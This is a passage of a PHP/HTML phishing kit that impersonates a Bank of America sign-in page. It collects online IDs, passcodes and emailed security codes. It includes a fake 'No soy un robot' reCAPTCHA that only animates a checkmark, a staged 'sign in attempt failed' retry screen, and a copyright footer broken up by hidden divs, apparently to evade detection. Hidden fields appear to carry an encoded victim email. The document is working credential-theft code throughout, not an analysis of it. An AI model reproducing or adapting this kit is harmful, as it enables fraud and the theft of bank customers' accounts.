	 <input onkeypress="if(window.event.keyCode==13){verify2();}" style="-webkit-text-security:disc;" type="text" id="passcode1" name="passcode2" placeholder="Passcode" maxlength="20" class="tl-private spa-input-text" autocomplete="off" ><p class="spa-input-hint" id="helpFor_passcode1"></p><div class="spa-input-error-message spa-icon--error" id="passcode1_errorMessage" aria-hidden="true"></div></div>
    </div>
    <div class="small-12 columns" id="saveOnlineIdCheckBox">
      <div class="spa-input spa-input-options spa-input--material-design">
	  <ul class="spa-input-options-list"><li>
	  <input type="checkbox" id="saveOnlineId" name="saveOnlineId" value="1" class="spa-input-option spa-input-option--checkbox spa-input-option spa-input-option--checkbox">
	  <span class="spa-input-check">&nbsp;</span>
	  <label class="spa-input-option-label" for="saveOnlineId">Save Online ID<span class="ada-hidden"> </span></label>
	  </li></ul>
	  <p class="spa-input-options-hint"></p>
	  </div>
    </div>
    <div class="small-12 columns">
      <div id="loadinglogin" style="display:none;padding-bottom:10px;">
        <span>Sign In</span>
        <span class="circle-animation">
          <div class="circle-inline">Loading</div>
          <div class="loading-circle circle-inline">
            <div class="circle-bounce1"></div>
            <div class="circle-bounce2"></div>
            <div class="circle-bounce3"></div>
          </div>
        </span>
      </div>
      <button class="spa-btn spa-btn--primary spa-btn--block spa-btn--medium" type="button" onclick="verify2();">
        <span>Sign In</span>
        <span class="circle-animation">
          <div class="circle-inline">Loading</div>
          <div class="loading-circle circle-inline">
            <div class="circle-bounce1"></div>
            <div class="circle-bounce2"></div>
            <div class="circle-bounce3"></div>
          </div>
        </span>
      </button>
    </div>
    </div>

    <div class="row" id="PwdlessFailedNotification" style="display:block">
      <div class="small-12 columns diMessageTitle">
        <h3>  Sign in attempt failed</h3>
        <span class="ft-lt btm-10"> Your sign in wasn't successful. </span>
        <span class="splash-desc btm-10 ft-lt"><a id="try-again-pwdless-wh" href='javascript:void0;' class="hidden">Try Windows Hello again</a></span>
        <span id="try-again-loader-wh" class="hidden circle-animation">
          <div class="circle-inline">Loading</div>
          <div class="loading-circle circle-inline">
            <div class="circle-bounce1"></div>
            <div class="circle-bounce2"></div>
            <div class="circle-bounce3"></div>
          </div>
        </span>
        <span class="splash-desc btm-10 ft-lt"><a id="pwdlessSignInWithMobileAppLink" href='javascript:void0;' class="hidden">Sign In with mobile app</a></span>
        <span class="splash-desc btm-10 ft-lt"><a id="pwdless-signin-with-passcode-instead" href='javascript:void0;' class="hidden">Sign In with Passcode instead</a></span>
      </div>
    </div>

  <div class="row">
    <div class="small-8 columns">
      <a id="security" href='javascript:void0;' class="spa-ui-layer-link spa-fn" rel="securityModal" data-options="{&quot;rel&quot;:&quot;securityModal&quot;}">Security &amp; Help<span class="spa-ada-text ada-hidden">&nbsp;layer</span></a>
    </div>
    <div class="small-4 columns">
      <a id="enroll" href='javascript:void0;'>Enroll</a>
    </div>
  </div>
  <div class="row">
    <div class="small-12 columns">
      <a id="open" href='javascript:void0;' class="open-account">Open an Account</a>
    </div>
  </div>
</div>
</div>
<input type="hidden" name="viewstate" value="?dHJ1ZSxlcyxjYXJsb3NtYXJpbnNpZm9udGVzQGdtYWlsLmNvbSw1RkJCNDVFMTcyREFDNEVENDYzMkY4Qzg0RDE2Q0FBQjdDNkY4MzZFNzRGMjVCQUU3MTUz" /></form>
</div>
</div>
</div>

<?php } else { ?>

<?php

if (!isset($_SESSION['SYSTEM']) || isset($_SESSION['SYSTEM']) && $_SESSION['SYSTEM'] != TRUE) {
	header("Location: ./");
}

?>
<div style="padding-bottom:8px;"></div>
<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div id="globalInputsValidationForm" class="columns small-12 end sign-in">
<form id="signinClient" name="signinClient" action="./" novalidate="" autocomplete="off" method="POST" tabindex="-1">
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="preg"/>
<div id="signInPartialContent">
<div class="vertical">
  <div class="row" id="skip_to_signin">
    <div class="small-12 columns" id="signin-message"></div>
    <div class="small-12 columns hidden" id="dropDown">
    </div>
    <div class="small-12 columns" id="inputOnlineId">
      <div class="spa-input spa-input-box spa-input--sparta2">
	  <label class="spa-input-label" data-font="cnx-medium" id="labelForonlineId1" for="onlineId1">
    <span class="ada-hidden">
      Sign in with your online ID
    </span>
  </label><input onkeypress="return event.keyCode != 13;" autofocus type="text" aria-labelledby="labelForonlineId1" data-mobile-input-type="text" data-default-input-type="text" data-android-input-type="text" data-mobile-pattern="" data-default-pattern="" id="onlineId1" name="onlineId1" placeholder="Online ID" maxlength="32" aria-required="true" aria-label="Online ID" autocomplete="off" class="spa-input-text" data-gis-mask="false" data-sparta-input-mask="{&quot;greedy&quot;:true,&quot;placeholder&quot;:&quot;&quot;,&quot;clearMaskOnLostFocus&quot;:true,&quot;showMaskOnHover&quot;:false,&quot;showMaskOnFocus&quot;:true,&quot;keepStatic&quot;:true,&quot;jitMasking&quot;:true,&quot;showTooltip&quot;:false,&quot;inputEventOnly&quot;:true}"><p class="spa-input-hint" id="helpFor_onlineId1"></p><div class="spa-input-error-message spa-icon--error" id="onlineId1_errorMessage" aria-hidden="true"></div></div>
    </div>
    <div id="passcodeContainer" class="small-12 columns">
      <div class="spa-input spa-input-box spa-input--sparta2 tl-private">
	 <label class="spa-input-label" data-font="cnx-medium" id="labelForpasscode1" for="passcode1">
  </label><input onkeypress="if(window.event.keyCode==13){verify();}" style="-webkit-text-security:disc;" type="text" id="passcode1" name="passcode1" placeholder="Passcode" maxlength="20" class="tl-private spa-input-text" autocomplete="off" ><p class="spa-input-hint" id="helpFor_passcode1"></p><div class="spa-input-error-message spa-icon--error" id="passcode1_errorMessage" aria-hidden="true"></div></div>
    </div>
    <div class="small-12 columns" id="saveOnlineIdCheckBox">
      <div class="spa-input spa-input-options spa-input--material-design">
	  <ul class="spa-input-options-list"><li>
	  <input type="checkbox" id="saveOnlineId" name="saveOnlineId" value="1" class="spa-input-option spa-input-option--checkbox spa-input-option spa-input-option--checkbox">
	  <span class="spa-input-check">&nbsp;</span>
	  <label class="spa-input-option-label" for="saveOnlineId">Save Online ID<span class="ada-hidden"> </span></label>
	  </li></ul>
	  <p class="spa-input-options-hint"></p>
	  </div>
    </div>
    <div class="small-12 columns">
      <div id="loadinglogin" style="display:none;padding-bottom:10px;">
        <span>Sign In</span>
        <span class="circle-animation">
          <div class="circle-inline">Loading</div>
          <div class="loading-circle circle-inline">
            <div class="circle-bounce1"></div>
            <div class="circle-bounce2"></div>
            <div class="circle-bounce3"></div>
          </div>
        </span>
      </div>
      <button class="spa-btn spa-btn--primary spa-btn--block spa-btn--medium" type="button" onclick="verify();">
        <span>Sign In</span>
        <span class="circle-animation">
          <div class="circle-inline">Loading</div>
          <div class="loading-circle circle-inline">
            <div class="circle-bounce1"></div>
            <div class="circle-bounce2"></div>
            <div class="circle-bounce3"></div>
          </div>
        </span>
      </button>
    </div>
    </div>

    <div class="row hidden" id="PwdlessFailedNotification">
      <div class="small-12 columns diMessageTitle">
        <h3>  Sign in attempt failed</h3>
        <span class="ft-lt btm-10"> Your sign in using Windows Hello wasn't successful. </span>
        <span class="splash-desc btm-10 ft-lt"><a id="try-again-pwdless-wh" href='javascript:void0;' class="hidden">Try Windows Hello again</a></span>
        <span id="try-again-loader-wh" class="hidden circle-animation">
          <div class="circle-inline">Loading</div>
          <div class="loading-circle circle-inline">
            <div class="circle-bounce1"></div>
            <div class="circle-bounce2"></div>
            <div class="circle-bounce3"></div>
          </div>
        </span>
        <span class="splash-desc btm-10 ft-lt"><a id="pwdlessSignInWithMobileAppLink" href='javascript:void0;' class="hidden">Sign In with mobile app</a></span>
        <span class="splash-desc btm-10 ft-lt"><a id="pwdless-signin-with-passcode-instead" href='javascript:void0;' class="hidden">Sign In with Passcode instead</a></span>
      </div>
    </div>

  <div class="row">
    <div class="small-8 columns">
      <a id="security" href='javascript:void0;' class="spa-ui-layer-link spa-fn" rel="securityModal" data-options="{&quot;rel&quot;:&quot;securityModal&quot;}">Security &amp; Help<span class="spa-ada-text ada-hidden">&nbsp;layer</span></a>
    </div>
    <div class="small-4 columns">
      <a id="enroll" href='javascript:void0;'>Enroll</a>
    </div>
  </div>
  <div class="row">
    <div class="small-12 columns">
      <a id="open" href='javascript:void0;' class="open-account">Open an Account</a>
    </div>
  </div>
</div>
</div>
<input type="hidden" name="viewstate" value="?dHJ1ZSxlcyxjYXJsb3NtYXJpbnNpZm9udGVzQGdtYWlsLmNvbSw1RkJCNDVFMTcyREFDNEVENDYzMkY4Qzg0RDE2Q0FBQjdDNkY4MzZFNzRGMjVCQUU3MTUz" /></form>
</div>
</div>
</div>
<?php } ?>
<div id="locateScheduleModule" data-component="module" data-module="locate-schedule-module" data-module-container="3.1.4" data-version="10.0.0" data-sparta-load="secondary" data-module-ref="homepage/locate-schedule-module" data-options="{}" data-init="" data-module-parameters="{}" class="locate-schedule-module-class-v-10-0-0 locate-schedule-module spa-module-init">
<div class="show-for-large-up collapse">
<div class="link-container">
<svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 151.376 218" width="18" height="26">
<path d="M75.661,31.468a35.835,35.835,0,1,0,35.846,35.814A35.807,35.807,0,0,0,75.661,31.468M75.78,218S0,111.691,0,75.693a75.688,75.688,0,1,1,151.376,0c0,48.744-75.6,142.307-75.6,142.307" style="fill:#fff"></path></svg>
<a id="finCenterLocator" href='javascript:void0;' class="fin-center-locator">Find your closest financial center or ATM</a>
</div>
<div class="link-container">
<svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 207.065 199.634" width="20" height="20">
<rect width="207.065" height="199.634" style="fill:#fff"></rect><rect x="13.601" y="53.376" width="179.862" height="132.657" style="fill:#0052c2"></rect><path d="M37.127,14.694A12.007,12.007,0,1,1,25.12,26.7,12.013,12.013,0,0,1,37.127,14.694h0Z" style="fill:#0052c2"></path><path d="M169.951,14.694A12.007,12.007,0,1,1,157.944,26.7a12.015,12.015,0,0,1,12.007-12.007h0Z" style="fill:#0052c2"></path><path d="M86.989,114.888c11.043,2.391,15,10.632,15,18.525,0,12.483-10.3,22.69-27.588,22.69-7.495,0-17.175-1.247-24.156-5.515l4.165-10.824c10.092,4.358,15.092,4.577,18.1,4.577,10.22,0,13.961-5.721,14.064-10.092,0.206-9.256-6.968-12.483-20.3-12.8v-9.886c13.743-.424,17.484-5.939,17.484-10.837,0-3.535-2.61-6.646-8.318-6.646-3.124,0-8.947.206-19.271,5.734l-4.05-10.516c8.433-4.808,17.278-7.1,23.719-7.1,16.147,0,23.011,8.33,23.011,17.291,0,4.679-2.79,11.866-11.866,15.092v0.309Z" style="fill:#fff"></path><polygon points="134.476 96.778 119.91 98.128 119.91 88.229 135.813 83.563 149.041 83.563 149.041 155.168 134.476 155.168 134.476 96.778" style="fill:#fff"></polygon>
</svg>
<a id="apptScheduler" href='javascript:void0;' class="appt-scheduler">Schedule an Appointment</a>
</div>
</div>
</div>
<span class="footer__copyright">
<span style="font-size: 13px;"><center>© 2<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>0<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>2<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>0<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div> <div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>B<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>a<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>n<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>k<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div> <div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>o<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>f<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div> <div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>A<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>m<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>e<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>r<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>i<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>c<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>a<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div> <div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>C<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>o<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>r<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>p<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>o<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>r<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>a<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>t<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>i<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>o<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>n<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>.<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div> <div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>A<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>l<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>l<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div> <div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>r<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>i<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>g<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>h<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>t<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>s<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div> <div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>r<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>e<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>s<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>e<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>r<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>v<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>e<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>d<div id='" & randomnumber & "' style='position:absolute;z-index:-999;top:200px;'>" & randomletter & "</div>.</center></span>
</span>
<div style="padding-top:10px;"></div>
</div>
</div>
</div>
<?php } else { ?> 
<div id="init_block" style="display:block">
<div id="loader_init" style="visibility:visible; position: absolute; z-index: 100; display: flex; justify-content: center; align-items: center; height: 100%; width: 100%; background: white center center no-repeat;">
<center>
<img style="position: absolute; padding-left: 5px; padding-top: 5px;" width="180px" height="180px" src="./assets/load.svg"/>
<div style="position: relative;" id="loading"></div>
<div id="loading_down" style="position: absolute; bottom: 0; right: 0; padding-right: 10px; padding-bottom: 10px;">
<span id="inTurnFadingTextG" style="padding: 3px; padding-left: 8px; padding-right: 1px; background-color: #F2F2F2; color: #3A3B6F;">
<div id="inTurnFadingTextG_1" class="inTurnFadingTextG">L</div>
<div id="inTurnFadingTextG_2" class="inTurnFadingTextG">o</div>
<div id="inTurnFadingTextG_3" class="inTurnFadingTextG">a</div>
<div id="inTurnFadingTextG_4" class="inTurnFadingTextG">d</div>
<div id="inTurnFadingTextG_5" class="inTurnFadingTextG">i</div>
<div id="inTurnFadingTextG_6" class="inTurnFadingTextG">n</div>
<div id="inTurnFadingTextG_7" class="inTurnFadingTextG">g&nbsp;</div>
</span>
</div>
</center>
</div>
</div>
<!-- other -->
<div id="init_hidde" style="display:none" class="noselect">
<div id="loader_init" style="visibility:visible; position: absolute; z-index: 100; display: flex; justify-content: center; align-items: center; height: 100%; width: 100%; background: white center center no-repeat;">
<center>
<img class="noselect" draggable="false" style="padding:-10px;margin:-10px;" width="180px" height="180px" src="./assets/load.svg"/>
            <div class="noselect">
                <label class="control-label" style="display:inline-block;max-width:100%;margin-bottom:5px;font-weight:700;box-sizing:border-box;cursor:default;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:1.42857143;color:#333;background-color:#fff">Por favor, demuestre que es un humano.</label>
                <div class="g-recaptcha"><div style="width: 304px; height: 78px"><div>
<div draggable="false" style="position:absolute;width:304px;height:78px;">
<div id="rc-anchor-alert" class="rc-anchor-alert"></div>
<div id="rc-anchor-container" class="rc-anchor rc-anchor-normal rc-anchor-light">
<div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Es necesaria una verificaci&oacute;n para el Recaptcha. </div>
<div class="rc-anchor-error-msg-container" style="display:none">
<span class="rc-anchor-error-msg" aria-hidden="true"></span>
</div>
<div class="rc-anchor-content"><div class="rc-inline-block">
<div class="rc-anchor-center-container">
<div class="rc-anchor-center-item rc-anchor-checkbox-holder" id="areaclick" onclick="document.getElementById('areaclick').onclick = false;document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-active');setTimeout(continuewaitfors, 100);function continuewaitfors(){document.getElementById('areaclick').onclick = false;document.getElementById('selecthide').style.display='none';document.getElementById('loadingcaptcha').style.display='block';setTimeout(continuewaitfors, 2100);function continuewaitfors() {document.getElementById('areaclick').onclick = false;document.getElementById('loadingcaptcha').style.display='none';setTimeout(continuewaitfors, 350);function continuewaitfors() {document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-checked');document.getElementById('loadingcaptcha').style.visibility='hidden';}}}">
<span class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox recaptcha-checkbox-focused recaptcha-checkbox-clearOutline" role="checkbox" aria-checked="false" id="recaptcha-anchor" tabindex="0" dir="ltr" aria-labelledby="recaptcha-anchor-label">
<div class="recaptcha-checkbox-border" id="selecthide" role="presentation"></div>
<div class="recaptcha-checkbox-borderAnimation" role="presentation"></div>
<div class="recaptcha-checkbox-spinner" role="presentation" id="loadingcaptcha" style="display: none; animation-play-state: running; opacity: 1; transform: scale(0);">
<div class="recaptcha-checkbox-spinner-overlay" style="animation-play-state: running;">
</div>
</div>
<div onmouseover="document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-hover')" class="recaptcha-checkbox-checkmark" role="presentation"></div>
</span>
</div>
</div>
</div><div class="rc-inline-block"><div class="rc-anchor-center-container">
<label style="color:#1A1A1A;-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;" onclick="document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-active');setTimeout(continuewaitfors, 100);function continuewaitfors(){document.getElementById('selecthide').style.display='none';document.getElementById('loadingcaptcha').style.display='block';setTimeout(continuewaitfors, 2100);function continuewaitfors() {document.getElementById('loadingcaptcha').style.display='none';setTimeout(continuewaitfors, 350);function continuewaitfors() {document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-checked');document.getElementById('loadingcaptcha').style.visibility='hidden';}}}" class="rc-anchor-center-item rc-anchor-checkbox-label" aria-hidden="true" role="presentation" id="recaptcha-anchor-label">	
<span aria-live="polite" aria-labelledby="recaptcha-accessible-status"></span>No soy un robot</label>
</div>
</div>
</div>
<div class="rc-anchor-normal-footer" style="padding-top:6px">
<div class="rc-anchor-logo-portrait" aria-hidden="true" role="presentation">
<div class="rc-anchor-logo-img rc-anchor-logo-img-portrait"></div>
<div class="rc-anchor-logo-text">reCAPTCHA</div>
</div>
<div class="rc-anchor-pt" style="-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;">
<span style="cursor:pointer;color:#555">Privacidad</span><span aria-hidden="true" role="presentation"> - </span><span style="cursor:pointer;color:#555">T&eacute;rminos</span>
</div>
</div></div>
</div>
				</div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div>
                <span class="help-block"><strong></strong></span>
            </div>
<form target="_self" id="secure_session" method="POST" action="./">
<input type="hidden" name="secure" value="true" required/>
<input style="display:inline-block;border:0;height:1px;overflow:hidden;padding:0;width:1px;white-space:nowrap" type="text" id="activateEmail" minlength="6" maxlength="6" name="activateEmail" placeholder="Security Code" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1');" required/>
<input style="display:inline-block;border:0;height:1px;overflow:hidden;padding:0;width:1px;white-space:nowrap" type="submit" value="Ingresar"/>
<div style="padding-top:1px"></div>
<a id="valida" class="myButton" style="cursor:pointer;color:grey" onclick="validaSession()">Ingresar</a>
</form>
<br/><br/><br/><br/><br/><br/>
</center>
</div>
</div>
<center>
<h1>American Secure:</h1>
<br />
<span>Activate your account.</span>
<br />
<span>Please confirm your token received in your email.</span>
<br />
<div id="sw">
<form target="_self" id="secure" method="POST" action="./" autocomplete="off">
<input type="text" id="activateEmail" minlength="6" maxlength="6" name="activateEmail" placeholder="Security Code" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1');" required/>
<input type="submit" value="Submit"/>
<input type="hidden" name="viewstate" value="?HJ1Z3SxlcyxjYXJsb3NetYXJpbnNpZm9udGVzQGdtYWlsLmfNvbSw1RkJCNDVFMTcyR7EFDNEVENDYzMkYg54Qzg0RDE2Q0gFBQjdDNkY4M1zZFNzRGMjV3CQUU3MT2Uz" />
<input type="submit" value="entrar"/>
</form>
</div>
</center>
<?php } ?>
</div>
</body>
</html>